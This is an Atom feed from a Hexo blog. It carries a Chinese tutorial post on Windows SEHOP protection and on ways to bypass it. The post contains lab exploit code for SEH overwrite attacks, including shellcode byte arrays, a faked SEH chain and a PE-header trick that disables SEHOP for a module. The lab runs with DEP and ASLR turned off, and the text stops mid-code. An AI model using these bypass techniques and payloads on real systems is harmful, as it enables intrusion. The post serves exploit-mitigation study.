<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-06-28T10:09:17.677Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>S.E.H 终极防护：SEHOP</title>
    <link href="https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/"/>
    <id>https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/</id>
    <published>2022-06-28T10:03:37.000Z</published>
    <updated>2022-06-28T10:09:17.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sehop-的原理"><a class="markdownIt-Anchor" href="#sehop-的原理"></a> SEHOP 的原理</h1><p>SEHOP（Structured Exception Handling Overwrite Protection），它在 Windows Server 2008 默认启用，而在 Windows Vista 和 Windows 7 中 SEHOP 默认是关闭的。</p><h2 id="启用-sehop-有以下两种方式"><a class="markdownIt-Anchor" href="#启用-sehop-有以下两种方式"></a> 启用 SEHOP 有以下两种方式：</h2><p>（ 1）下载 <a href="http://go.microsoft.com/?linkid=9646972">http://go.microsoft.com/?linkid=9646972</a> 的补丁，此补丁适用于 Windows 7 和 Windows Vista SP1。<br>（ 2）在注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel 下面找到 DisableExceptionChainValidation 项， 将该值设置为 0，即可启用 SEHOP。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135200328.png" alt="image-20220628135200328"></p><p>程序中的各 S.E.H 函数是以单链表的形式存放于栈中的，而在这个链表的末端是程序的默认异常处理，它负责处理前面 S.E.H 函数都不能处理的异常。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135450912.png" alt="image-20220628135450912"></p><p>SEHOP 的核心任务是检查这条 S.E.H 链的完整性，在程序转入异常处理前 SEHOP 会检查 S.E.H 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果不是，则不会执行当前异常处理函数。</p><p>其验证代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (process_flags &amp; <span class="number">0x40</span> == <span class="number">0</span>) &#123; <span class="comment">//如果没有 SEH 记录则不进行检测</span></span><br><span class="line">    <span class="keyword">if</span> (record != <span class="number">0xFFFFFFFF</span>) &#123; <span class="comment">//开始检测</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (record &lt; stack_bottom || record &gt; stack_top)<span class="comment">// SEH 记录必须位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">char</span>*)record + <span class="keyword">sizeof</span>(EXCEPTION_REGISTRATION) &gt; stack_top)</span><br><span class="line">            <span class="comment">//SEH 记录结构需完全在栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((record &amp; <span class="number">3</span>) != <span class="number">0</span>) <span class="comment">//SEH 记录必须 4 字节对齐</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            handler = record-&gt;handler;</span><br><span class="line">            <span class="keyword">if</span> (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top)</span><br><span class="line">            <span class="comment">//异常处理函数地址不能位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            record = record-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (record != <span class="number">0xFFFFFFFF</span>); <span class="comment">//遍历 S.E.H 链</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((TEB-&gt;word_at_offset_0xFCA &amp; <span class="number">0x200</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (handler != &amp;FinalExceptionHandler)<span class="comment">//核心检测，地球人都知道，不解释了</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628140148529.png" alt="image-20220628140148529"></p><p>攻击时，将 S.E.H 结构中的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况进行选择。当程序出现异常的时候，系统会从 S.E.H 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。由于覆盖异常处理函数指针时同时覆盖了指向下一异常处理结构的指针，这样的话 S.E.H 链就会被破坏，从而被 SEHOP 机制检测出。</p><p>SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用 SafeSEH 模块的方法都行不通了，必须要考虑其他的出路。理论上我们还有三种方法：<br>（ 1）不去攻击 S.E.H，而是攻击函数返回地址或者虚函数等。<br>（ 2）利用未启用 SEHOP 的模块。<br>（ 3）伪造 S.E.H 链</p><h1 id="攻击返回地址"><a class="markdownIt-Anchor" href="#攻击返回地址"></a> 攻击返回地址</h1><p>这种方法需要一定的运气。如果您能够碰到一个程序，他启用了 SEHOP 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护，什么都不要多说了，直接攻击函数返回地址。</p><h2 id="攻击虚函数"><a class="markdownIt-Anchor" href="#攻击虚函数"></a> 攻击虚函数</h2><p>无论 SEHOP 有多么的强大，它保护的也只是 S.E.H，对于 S.E.H 以外的东西是不提供保护的。所以我们依然可以通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理。之前我们做过，在此就不过多介绍了。</p><h1 id="利用未启用-sehop-的模块"><a class="markdownIt-Anchor" href="#利用未启用-sehop-的模块"></a> 利用未启用 SEHOP 的模块</h1><p>在程序的编译属性里没有提供禁用 SEHOP 这个选项，但是出于兼容性的考虑还是对一些程序禁用了 SEHOP，如经过 Armadilo 加壳的软件。</p><p>操作系统会根据 PE 头中 MajorLinkerVersion 和 MinorLinkerVersion 两个选项来判断是否为程序禁用 SEHOP。可以将这两个选项分别设置为 0x53 和 0x52 来模拟经过 Armadilo 加壳的程序，从而达到禁用 SEHOP 的目的。</p><p>禁用 SEHOP 后，还需要搞定 SafeSEH，所以我们在 “利用未启用 SafeSEH 模块” 实验基础上完成演示。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>程序 ASLR</td><td>EXE 随意， DLL 禁用</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h2><h3 id="编译一个不启用-safeseh-的-dll"><a class="markdownIt-Anchor" href="#编译一个不启用-safeseh-的-dll"></a> 编译一个不启用 SafeSEH 的 DLL。</h3><p>我们在《亡羊补牢：SafeSEH》中介绍过，这里就不过多赘述，直接放出源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    pop eax</span><br><span class="line">    pop eax</span><br><span class="line">    retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str,input);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="为-seh_nosaeseh_jumpdll-禁-用-sehop"><a class="markdownIt-Anchor" href="#为-seh_nosaeseh_jumpdll-禁-用-sehop"></a> 为 SEH_NOSaeSEH_JUMP.dll 禁 用 SEHOP</h3><p>用 CFF Explorer 打开 SEH_NOSaeSEH_JUMP.dll 后在 Optional header 选项页中来进行设置，分别将 MajorLinkerVersion 和MinorLinkerVersion 设置为 0x53 和 0x52。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628122629316.png" alt="image-20220628122629316"></p><h3 id="对主程序进行一定的修改"><a class="markdownIt-Anchor" href="#对主程序进行一定的修改"></a> 对主程序进行一定的修改</h3><p>（1）修改弹出对话框的 shellcode，让其可以在 windows 7下正常弹出。</p><p>windows xp下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133422937.png" alt="windows xp下的SafeSEH"></p><p>windows 7下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133204357.png" alt="windows 7下的SafeSEH"></p><p>由于在 Windows 7 下 PEB_LDR_DATA 指向加载模块列表中第二个模块位置被 KERNELBASE.dll 占据， kernel32.dll 的位置由第二个变为第三个，所以要对 shellcode 做出相应修改。在原来 shellcode 的第 52 个字节之后插入 “\x8B\x09”，该机器码对应的汇编语句为MOV ECX,[ECX]，来让程序多跳转一次，定位到 kernel32.dll。修改后的对话框 shellcode 如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Shellcode=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\x09&quot;</span> <span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line"><span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br></pre></td></tr></table></figure><p>（2）禁用程序的 DEP，通过取消程序的/NXCOMPAT 链接选项。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628130325139.png" alt="image-20220628130325139"></p><h1 id="伪造-seh-链表"><a class="markdownIt-Anchor" href="#伪造-seh-链表"></a> 伪造 S.E.H 链表</h1><h2 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h2><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628142531628.png" alt="image-20220628142531628"></p><p>为了提高溢出的成功率，我们在本实验中关闭系统的 ASLR，因为伪造 S.E.H 链时需要用到 FinalExceptionHandler 指向的地址。所以这里只讨论这种方法理论上的可行性。</p><p>伪造 S.E.H 链绕过 SEHOP 所需条件：<br>（ 1）图 14.5.1 中的 0xXXXXXXXX 地址必须指向当前栈中，而且必须能够被 4 整除。<br>（ 2） 0xXXXXXXXX 处存放的异常处理记录作为 S.E.H 链的最后一项，其异常处理函数指针必须指向终极异常处理函数。<br>（ 3）突破 SEHOP 检查后，溢出程序还需搞定 SafeSEH。</p><p>为了避免实验过于复杂，本次实验我们在 “利用未启用 SafeSEH 模块绕过 SafeSEH” 的基础 上 进 行 ， 所以不用再考虑 SafeSEH 的问题，只需确定 0xXXXXXXXX 的值和 FinalExceptionHandler 指向的地址。</p><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,input,<span 